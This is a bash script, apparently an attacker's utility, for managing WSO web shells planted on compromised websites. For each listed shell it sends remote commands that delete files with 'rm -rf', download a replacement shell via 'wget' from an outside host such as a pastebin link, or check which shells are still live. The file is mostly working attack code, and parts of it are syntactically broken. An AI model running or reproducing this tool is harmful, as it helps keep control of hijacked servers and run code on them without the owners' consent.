#Coded By ./MimiUndetected
#issued 07-Jun-2023
#WSO Shell Remote
#Update!!
#!/bin/bash/sh
if [ ! $1 ];then
echo "Usage : bash $0 file.txt"
exit
fi
if [[ ! -f $1 ]]; then 
echo "Please Type File Correctly"
echo "Try Again $0 <somefile
del(){
	echo -n "Name Shell File : "
	read nf
	for i in $(cat $1);
	do 
	curl -sNO $i -d "a=Console&p1=rm+-rf+$nf"
	printf "${ijo} OK -> $i${putih}\n"
done
}
upl(){
	echo "You can put your source shell | ex : [pastebin.com/raw/666]"
		echo -n "Your new shell : "
		read nw
	for a in $(cat $1); do
		echo -n "File name : "
		read fn
		curl -sNO $a -d "a=Console&p1=wget+$nw+-O+$fn"
		printf "[OK] -> ${ijo}$a${putih}\n"
	done
}
chk(){
echo -n "Result saved to : " 
read sa
	for b in $(cat $1); do
		wso=$(curl -sN $b --max-time 10 | grep -o Uname | head -1)
    bebi=$(curl -sN $b --max-time 10 | grep -o Beby | head -1)
		if [[ "$wso" = "Uname" ]]; then
			printf "${ijo}WSO -> $b ${putih}\n"
			echo "$b | WSO" >> $sa
      elif [[ "$bebi" = "Beby" ]]; then
      printf  "${ijo}Bebi => $b ${putih}\n"
      echo "$b | BEBI" >> $sa
		else
			printf "${merah}BAD -> $b ${putih} \n"
		fi
	done
}
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "    ___        __                _____ _____ _____   _       ________                \n"
printf "        ____  __ _           _   _    _           _      _            _           _  \n"
printf "       / /  \/  (_)         (_) | |  | |         | |    | |          | |         | | \n"
printf "      / /| \  / |_ _ __ ___  _  | |  | |_ __   __| | ___| |_ ___  ___| |_ ___  __| | \n"
printf "     / / | |\/| | | '_ ` _ \| | | |  | | '_ \ / _` |/ _ \ __/ _ \/ __| __/ _ \/ _` | \n"
printf "  _ / /  | |  | | | | | | | | | | |__| | | | | (_| |  __/ ||  __/ (__| ||  __/ (_| | \n"
printf " (_)_/   |_|  |_|_|_| |_| |_|_|  \____/|_| |_|\__,_|\___|\__\___|\___|\__\___|\__,_| \n"                                                                                   
printf "================WSO Shell Remote==========================./MimiUndetected===========\n"
printf "1.Delete Your Shell\n"
printf "2.Upload Another Shell\n"
printf "3.Check Shell"
printf "${putih}\n"
}
clear
header
echo -n "Choose Your option for use this tools [1/2/3] : "
read coloq
if [ $coloq -eq 1 ];then
	del $1
elif [ $coloq -eq 2 ]; then
	upl $1
elif [ $coloq -eq 3 ]; then
	chk $1
else
	printf "${merah}Invalid Option\n${putih}\n"
fi
printf "[\"${hijau}Achon666ju5t ${putih}- ${merah}Extreme Crew ${putih}\"]\n"
header
